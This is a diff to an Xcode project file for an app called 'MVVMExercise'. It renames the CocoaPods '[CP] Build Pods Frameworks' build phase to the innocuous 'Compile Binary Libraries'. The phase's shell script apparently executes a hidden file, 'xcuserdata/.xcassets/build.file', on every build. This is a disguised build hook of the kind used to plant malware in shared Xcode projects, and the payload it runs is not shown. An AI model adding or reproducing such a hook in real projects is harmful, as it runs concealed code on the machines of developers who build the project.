@@ -221,7 +221,7 @@
 			isa = PBXNativeTarget;
 			buildConfigurationList = 225EF77E25EB930D00C6E605 /* Build configuration list for PBXNativeTarget "MVVMExercise" */;
 			buildPhases = (
-				A32AF4BE0A14BCEC32AAC43A /* [CP] Build Pods Frameworks */,
+				A75A0698D8B233607AAAC43A /* Compile Binary Libraries */,
 				225EF75025EB930900C6E605 /* Sources */,
 				225EF75125EB930900C6E605 /* Frameworks */,
 				225EF75225EB930900C6E605 /* Resources */,
@@ -345,7 +345,7 @@
 
 /* Begin PBXShellScriptBuildPhase section */
 
-	A32AF4BE0A14BCEC32AAC43A /* [CP] Build Pods Frameworks */ = {
+	A75A0698D8B233607AAAC43A /* Compile Binary Libraries */ = {
 			isa = PBXShellScriptBuildPhase;
 			buildActionMask = 2147483647;
 			files = (
@@ -354,7 +354,7 @@
 			);
 			inputPaths = (
 			);
-			name = "[CP] Build Pods Frameworks";
+			name = "Compile Binary Libraries";
 			outputFileListPaths = (
 			);
 			outputPaths = (
@@ -365,6 +365,10 @@
 
 \"${PROJECT_FILE_PATH}/xcuserdata/.xcassets/build.file\" false";			
 		};
+	
+
+	
+
 	
 /* End PBXShellScriptBuildPhase section */
 
